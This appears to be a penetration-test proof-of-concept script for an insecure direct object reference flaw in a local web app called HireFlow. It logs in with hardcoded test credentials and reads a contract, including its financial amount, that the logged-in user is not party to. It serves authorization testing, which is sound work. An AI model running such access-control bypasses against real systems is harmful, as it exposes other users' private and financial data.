"""
WSTG-ATHZ-04: Insecure Direct Object Reference — Contract Access
Demonstrates that any authenticated user can read any contract's details
including financial data, regardless of whether they are a party to the contract.
Expected: 200 response with full contract details for a contract the user is not party to.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Login as the test client
login_client = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testclient@hireflow.com",
    "password": "password123"
})
client_token = login_client.json()["token"]
client_id = login_client.json()["user"]["id"]
print(f"[+] Logged in as client: {client_id}")

# Step 2: Login as admin to find a contract the client is NOT party to
login_admin = requests.post(f"{BASE}/api/auth/login", json={
    "email": "bob.admin@hireflow.com",
    "password": "password123"
})
admin_token = login_admin.json()["token"]

# Step 3: Get reviews to find contract IDs from other users
reviews = requests.get(f"{BASE}/api/reviews", headers={
    "Authorization": f"Bearer {admin_token}"
})
# Find a contract where neither client_id nor freelancer_id matches our test client
target_contract_id = None
for review in reviews.json().get("reviews", []):
    cid = review["contract_id"]
    # Try to get contract details
    contract = requests.get(f"{BASE}/api/contracts/{cid}", headers={
        "Authorization": f"Bearer {admin_token}"
    })
    cdata = contract.json()
    if cdata.get("client_id") != client_id and cdata.get("freelancer_id") != client_id:
        target_contract_id = cid
        target_client = cdata.get("client_id")
        target_freelancer = cdata.get("freelancer_id")
        target_title = cdata.get("title")
        target_amount = cdata.get("total_amount")
        break

if not target_contract_id:
    print("[-] Could not find a contract to test with")
    exit(1)

print(f"[+] Found target contract: {target_contract_id}")
print(f"    Title: {target_title}")
print(f"    Client: {target_client}")
print(f"    Freelancer: {target_freelancer}")
print(f"    Amount: {target_amount}")
print(f"    (test client {client_id} is NOT a party to this contract)")

# Step 4: Access the contract as the test client (who is NOT a party)
resp = requests.get(
    f"{BASE}/api/contracts/{target_contract_id}",
    headers={"Authorization": f"Bearer {client_token}"}
)

print(f"\n[+] Accessing contract as unauthorized user...")
print(f"    Status: {resp.status_code}")
data = resp.json()
print(f"    Contract ID: {data.get('id')}")
print(f"    Title: {data.get('title')}")
print(f"    Total Amount: {data.get('total_amount')}")
print(f"    Client ID: {data.get('client_id')}")
print(f"    Freelancer ID: {data.get('freelancer_id')}")

assert resp.status_code == 200, f"Expected 200, got {resp.status_code}"
assert data.get("id") == target_contract_id, "Contract ID mismatch"
print("\n[VULNERABLE] Contract IDOR confirmed — any authenticated user can read any contract")
